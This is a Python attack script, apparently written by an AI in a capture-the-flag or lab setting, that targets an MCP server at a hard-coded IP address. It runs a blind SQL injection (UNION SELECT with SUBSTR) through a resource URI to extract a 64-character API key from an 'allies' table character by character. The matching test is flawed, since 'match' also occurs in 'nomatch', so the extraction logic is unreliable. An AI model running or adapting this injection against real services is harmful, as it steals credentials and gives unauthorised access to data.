#!/usr/bin/env python3
"""
Get Fresh Ally Key from Database
Author: Claude
Purpose: Extract a valid ally API key from the current instance
Created: 2025-11-23
Updated: 2025-11-23
Expected Result: Get a working ally API key
Produced Result: TBD
"""

import requests
import json
import string

MCP_URL = "http://154.57.164.74:31735/mcp/"

class MCPClient:
    def __init__(self, url):
        self.url = url
        self.session_id = None
        self.msg_id = 0

    def send_request(self, method, params=None):
        self.msg_id += 1
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "params": params or {},
            "id": self.msg_id
        }
        headers = {
            "Content-Type": "application/json",
            "Accept": "application/json, text/event-stream"
        }
        if self.session_id:
            headers["mcp-session-id"] = self.session_id
        resp = requests.post(self.url, json=payload, headers=headers)
        if "mcp-session-id" in resp.headers:
            self.session_id = resp.headers["mcp-session-id"]
        if resp.text.startswith("event:"):
            lines = resp.text.strip().split('\n')
            for line in lines:
                if line.startswith("data: "):
                    return json.loads(line[6:])
        return resp.json()

    def initialize(self):
        return self.send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "explorer", "version": "1.0"}
        })

    def read_resource(self, uri):
        return self.send_request("resources/read", {"uri": uri})

client = MCPClient(MCP_URL)
client.initialize()

print("="*60)
print("Extracting Ally API Key from Database")
print("="*60)

# First let's check ally/status with a valid-looking key pattern
# to understand the column structure
test_key = "a" * 64

result = client.read_resource(f"ash-data://ally/status/{test_key}")
print("\n[*] Test query result:")
print(json.dumps(result, indent=2))

# Now try to extract actual API key using SQL injection
# Character-by-character extraction
print("\n[*] Extracting API key character by character...")

api_key = ""
for pos in range(1, 65):  # API keys are 64 chars
    found = False
    for char in string.hexdigits.lower():
        # SQLi to check if character at position matches
        sqli = f"a' UNION SELECT CASE WHEN SUBSTR(api_key,{pos},1)='{char}' THEN 'match' ELSE 'nomatch' END, 'test', 'test' FROM allies LIMIT 1--"

        result = client.read_resource(f"ash-data://ally/status/{sqli}")

        if "result" in result and "contents" in result["result"]:
            text = result["result"]["contents"][0]["text"]
            if "match" in text:
                api_key += char
                print(f"  Position {pos}: {char} (found: {api_key})")
                found = True
                break

    if not found:
        print(f"  Position {pos}: NOT FOUND - trying next position")
        break

print("\n" + "="*60)
print(f"Extracted API Key: {api_key}")
print("="*60)
